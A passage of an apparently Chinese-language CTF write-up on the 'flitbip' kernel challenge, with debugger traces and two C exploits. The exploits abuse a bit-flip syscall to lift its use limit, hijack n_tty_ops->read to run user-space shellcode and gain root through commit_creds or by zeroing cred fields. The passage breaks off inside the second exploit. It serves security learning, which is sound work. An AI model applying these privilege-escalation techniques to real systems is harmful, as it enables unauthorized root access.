   <span class="mh">0xffffffff81000bcf</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;</span>     <span class="n">cmp</span>    <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x223</span>
   <span class="mh">0xffffffff81000bd6</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>     <span class="n">ja</span>     <span class="mh">0xffffffff81000bf9</span>          <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;</span>
 
   <span class="mh">0xffffffff81000bd8</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>     <span class="n">cmp</span>    <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x224</span>
   <span class="mh">0xffffffff81000bdf</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;</span>     <span class="n">sbb</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
   <span class="mh">0xffffffff81000be2</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>    <span class="n">and</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
 <span class="err">►</span> <span class="mh">0xffffffff81000be5</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span><span class="o">*</span><span class="mi">8</span> <span class="o">-</span> <span class="mh">0x7e9ffee0</span><span class="p">]</span>     <span class="n">RAX</span><span class="p">,</span> <span class="p">[</span><span class="n">sys_call_table</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mh">0xffffffff8107b71c</span> <span class="p">(</span><span class="n">__x64_sys_read</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">]</span>
   <span class="mh">0xffffffff81000bed</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">rbx</span>
   <span class="mh">0xffffffff81000bf0</span> <span class="o">&lt;</span><span class="n">do_syscall_64</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="mh">0xffffffff81402000</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>直接 read 的表是只读的，改不了,可以继续跟踪，</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130406-gy14uc0.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130406-gy14uc0.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130447-m6tqs6o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130447-m6tqs6o.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>执行到 <code class="language-plaintext highlighter-rouge">tty_read</code>​ 就可以看到 有一个 <code class="language-plaintext highlighter-rouge">n_tty_ops</code>​ 是一个RW 的权限，</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="n">entry_SYSCALL_64</span>
<span class="n">entry_SYSCALL_64_after_hwframe</span>
<span class="n">do_syscall_64</span>
<span class="n">__x86_indirect_thunk_rax</span>
<span class="n">__x64_sys_read</span>
<span class="n">ksys_read</span>
<span class="n">vfs_read</span>
<span class="n">__vfs_read</span>
<span class="n">__x86_indirect_thunk_r8</span>
<span class="n">tty_read</span><span class="o">+</span><span class="mi">129</span> <span class="c1">// 可以在这里断点调试</span>
<span class="n">__x86_indirect_thunk_rax</span>
<span class="n">n_tty_read</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213131523-a2bkm4z.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213131523-a2bkm4z.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130630-ie8q2u7.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213130630-ie8q2u7.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213131625-x8scoao.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213131625-x8scoao.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>尝试修改</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>

    <span class="n">flitbip</span><span class="p">(</span><span class="n">flit_count</span> <span class="p">,</span> <span class="mi">63</span><span class="p">);</span>

    <span class="c1">// for(int i=0;i&lt;0x40;i++){</span>
    <span class="c1">//     flitbip(test_addr,i);</span>
    <span class="c1">// }</span>
    <span class="c1">// &gt;&gt;&gt; hex(1 &lt;&lt; 63)</span>
    <span class="c1">// 0x8000000000000000</span>
    <span class="kt">size_t</span> <span class="n">n_tty_ops</span> <span class="o">=</span> <span class="mh">0xffffffff8183e320</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">n_tty_read_got</span> <span class="o">=</span> <span class="n">n_tty_ops</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">n_tty_read</span> <span class="o">=</span> <span class="mh">0xffffffff810c8510</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mh">0x4142434445464748</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">n_tty_read</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="n">y</span><span class="p">){</span>
            <span class="n">flitbip</span><span class="p">(</span><span class="n">n_tty_read_got</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213132548-itsqa1k.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213132548-itsqa1k.png" alt="image" loading="lazy"></a>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213133012-ct9qy56.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213133012-ct9qy56.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="exploit1c"><span class="me-2">exploit1.c</span><a href="#exploit1c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>SMEP 已被禁用 ,  内核态可以执行用户态的text 段， ret2shellcode</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>




<span class="c1">// #define MAXFLIT 1</span>
<span class="c1">// </span>
<span class="c1">// #ifndef __NR_FLITBIP</span>
<span class="c1">// #define FLITBIP 333</span>
<span class="c1">// #endif</span>
<span class="c1">// </span>
<span class="c1">// long flit_count = 0;</span>
<span class="c1">// EXPORT_SYMBOL(flit_count);</span>
<span class="c1">// </span>
<span class="c1">// SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)</span>
<span class="c1">// {</span>
<span class="c1">//         if (flit_count &gt;= MAXFLIT)</span>
<span class="c1">//         {</span>
<span class="c1">//                 printk(KERN_INFO "flitbip: sorry :/\n");</span>
<span class="c1">//                 return -EPERM;</span>
<span class="c1">//         }</span>
<span class="c1">// </span>
<span class="c1">//         *addr ^= (1ULL &lt;&lt; (bit));</span>
<span class="c1">//         flit_count++;</span>
<span class="c1">// </span>
<span class="c1">//         return 0;</span>
<span class="c1">// }</span>

<span class="kt">int</span> <span class="nf">flitbip</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">int</span> <span class="n">bit</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">bit</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">n_tty_ops</span> <span class="o">=</span> <span class="mh">0xffffffff8183e320</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">n_tty_read</span> <span class="o">=</span> <span class="mh">0xffffffff810c8510</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mh">0x4142434445464748</span><span class="p">;</span>


<span class="c1">//typedef void (*run_cmd_t)(char * buf);</span>
<span class="k">typedef</span> <span class="nf">size_t</span> <span class="p">(</span><span class="o">*</span><span class="n">run_cmd_t</span><span class="p">)(</span><span class="kt">size_t</span> <span class="n">a1</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>

    <span class="c1">// 恢复 n_ttu_ops </span>
    <span class="kt">size_t</span> <span class="n">n_tty_read_got</span> <span class="o">=</span> <span class="n">n_tty_ops</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>
    <span class="p">((</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">n_tty_read_got</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">n_tty_read</span><span class="p">;</span>

    <span class="n">run_cmd_t</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="p">(</span><span class="n">run_cmd_t</span><span class="p">)</span><span class="mh">0xffffffff81033e92</span><span class="p">;</span>
    <span class="n">run_cmd_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="p">(</span><span class="n">run_cmd_t</span><span class="p">)</span><span class="mh">0xffffffff81033d41</span><span class="p">;</span>
    <span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>


    <span class="c1">// 貌似没有执行命令</span>
    <span class="c1">// run_cmd_t run_cmd = (run_cmd_t)0xffffffff81033f38;</span>
    <span class="c1">// run_cmd("id &gt; /home/flitbip/id");</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">"ret;"</span><span class="p">);</span>
  
<span class="p">}</span>

<span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mh">0xC</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>

    <span class="n">flitbip</span><span class="p">(</span><span class="n">flit_count</span> <span class="p">,</span> <span class="mi">63</span><span class="p">);</span>

    <span class="c1">// for(int i=0;i&lt;0x40;i++){</span>
    <span class="c1">//     flitbip(test_addr,i);</span>
    <span class="c1">// }</span>
    <span class="c1">// &gt;&gt;&gt; hex(1 &lt;&lt; 63)</span>
    <span class="c1">// 0x8000000000000000</span>
    <span class="kt">size_t</span> <span class="n">n_tty_read_got</span> <span class="o">=</span> <span class="n">n_tty_ops</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">n_tty_read</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">sc_addr</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="n">y</span><span class="p">){</span>
            <span class="n">flitbip</span><span class="p">(</span><span class="n">n_tty_read_got</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">repeat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>




</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="exploit2c"><span class="me-2">exploit2.c</span><a href="#exploit2c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>再来分析一下 这个</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150136-w11x6iz.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150136-w11x6iz.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">telescope</span> <span class="mh">0xffffffff8182e040</span>
<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span>  <span class="mh">0xffffffff8182e040</span> <span class="p">(</span><span class="n">current_task</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xffff88000230c000</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150156-dsu587i.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150156-dsu587i.png" alt="image" loading="lazy"></a>​</p>

<p>cred 结构体</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150925-khzvqb0.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213150925-khzvqb0.png" alt="image" loading="lazy"></a>​</p>

<p>0x3e8 就是 1000 权限uid, 全部改成0 就是 root 了</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>




<span class="c1">// #define MAXFLIT 1</span>
<span class="c1">// </span>
<span class="c1">// #ifndef __NR_FLITBIP</span>
<span class="c1">// #define FLITBIP 333</span>
<span class="c1">// #endif</span>
<span class="c1">// </span>
<span class="c1">// long flit_count = 0;</span>
<span class="c1">// EXPORT_SYMBOL(flit_count);</span>
<span class="c1">// </span>
<span class="c1">// SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)</span>
<span class="c1">// {</span>
<span class="c1">//         if (flit_count &gt;= MAXFLIT)</span>
<span class="c1">//         {</span>
<span class="c1">//                 printk(KERN_INFO "flitbip: sorry :/\n");</span>
<span class="c1">//                 return -EPERM;</span>
<span class="c1">//         }</span>
<span class="c1">// </span>
<span class="c1">//         *addr ^= (1ULL &lt;&lt; (bit));</span>
<span class="c1">//         flit_count++;</span>
<span class="c1">// </span>
<span class="c1">//         return 0;</span>
<span class="c1">// }</span>

<span class="kt">int</span> <span class="nf">flitbip</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">int</span> <span class="n">bit</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">333</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">bit</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">n_tty_ops</span> <span class="o">=</span> <span class="mh">0xffffffff8183e320</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">n_tty_read</span> <span class="o">=</span> <span class="mh">0xffffffff810c8510</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mh">0x4142434445464748</span><span class="p">;</span>


<span class="c1">//typedef void (*run_cmd_t)(char * buf);</span>
<span class="k">typedef</span> <span class="nf">size_t</span> <span class="p">(</span><span class="o">*</span><span class="n">run_cmd_t</span><span class="p">)(</span><span class="kt">size_t</span> <span class="n">a1</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>

    <span class="c1">// 恢复 n_ttu_ops </span>
    <span class="kt">size_t</span> <span class="n">n_tty_read_got</span> <span class="o">=</span> <span class="n">n_tty_ops</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>
    <span class="p">((</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">n_tty_read_got</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">n_tty_read</span><span class="p">;</span>

    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"mov rax, 0xffffffff8182e040;"</span>
        <span class="s">"mov rax,[rax];"</span>
        <span class="s">"add rax,0x3c0;"</span>
        <span class="s">"mov rax,[rax];"</span>

        <span class="s">"xor rdi,rdi;"</span>

        <span class="s">"add rax, 4;"</span>
        <span class="s">"mov [rax], rdi;"</span>

        <span class="s">"add rax, 8;"</span>
        <span class="s">"mov [rax], rdi;"</span>

        <span class="s">"add rax, 8;"</span>
        <span class="s">"mov [rax], rdi;"</span>

        <span class="s">"add rax, 8;"</span>
        <span class="s">"mov [rax], rdi;"</span>

        <span class="s">"ret;"</span>
    <span class="p">);</span>

    <span class="c1">// 貌似没有执行命令</span>
    <span class="c1">// run_cmd_t run_cmd = (run_cmd_t)0xffffffff81033f38;</span>
    <span class="c1">// run_cmd("id &gt; /home/flitbip/id");</span>
  
<span class="p">}</span>

<span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="kt">size_t</span> <span class="n">test_addr</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f70</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">flit_count</span> <span class="o">=</span> <span class="mh">0xffffffff818f4f78</span><span class="p">;</span>

    <span class="n">flitbip</span><span class="p">(</span><span class="n">flit_count</span> <span class="p">,</span> <span class="mi">63</span><span class="p">);</span>

    <span class="c1">// for(int i=0;i&lt;0x40;i++){</span>
    <span class="c1">//     flitbip(test_addr,i);</span>
    <span class="c1">// }</span>
    <span class="c1">// &gt;&gt;&gt; hex(1 &lt;&lt; 63)</span>
    <span class="c1">// 0x8000000000000000</span>
    <span class="kt">size_t</span> <span class="n">n_tty_read_got</span> <span class="o">=</span> <span class="n">n_tty_ops</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="n">n_tty_read</span> <span class="o">^</span> <span class="n">sc_addr</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span><span class="p">((</span><span class="n">target</span><span class="o">&gt;&gt;</span><span class="n">i</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">){</span>
            <span class="n">flitbip</span><span class="p">(</span><span class="n">n_tty_read_got</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">repeat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>

    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

